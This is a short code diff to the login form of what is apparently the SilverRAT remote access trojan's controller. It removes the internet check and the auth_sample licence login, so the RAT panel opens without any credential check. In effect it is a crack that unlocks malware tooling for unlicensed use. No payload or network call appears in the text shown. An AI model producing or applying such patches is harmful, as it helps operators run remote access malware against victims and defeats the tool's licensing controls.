@@ -55,16 +55,7 @@ public class Logger : Form
 
     private void Logger_Load(object sender, EventArgs e)
     {
-        if (!Methods.InternetState())
-        {
-            MessageBox.Show(this, "Please check internet connection!", "SilverRAT!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
-            Close();
-        }
-        else
-        {
-            auth_sample.init();
-            ReadProfil();
-        }
+        ReadProfil();
         Settings.ServerCertificate = new X509Certificate2(Settings.CertificatePath);
     }
 
@@ -72,18 +63,15 @@ public class Logger : Form
     {
         Login.Enabled = false;
         losg.Text = "Please wait logging in ...";
-        if (auth_sample.login(username.Text, password.Text))
+        if (RememberMeTolgo.Checked)
         {
-            if (RememberMeTolgo.Checked)
-            {
-                SaveProfil();
-            }
-            losg.Text = "Wait a moment for the program to initialize...";
-            Program.Silver = new FormSilver();
-            TransitionShowng.HideSync(panel1);
-            Hide();
-            Program.Silver.Show();
+            SaveProfil();
         }
+        losg.Text = "Wait a moment for the program to initialize...";
+        Program.Silver = new FormSilver();
+        TransitionShowng.HideSync(panel1);
+        Hide();
+        Program.Silver.Show();
         losg.Text = "";
         Login.Enabled = true;
 
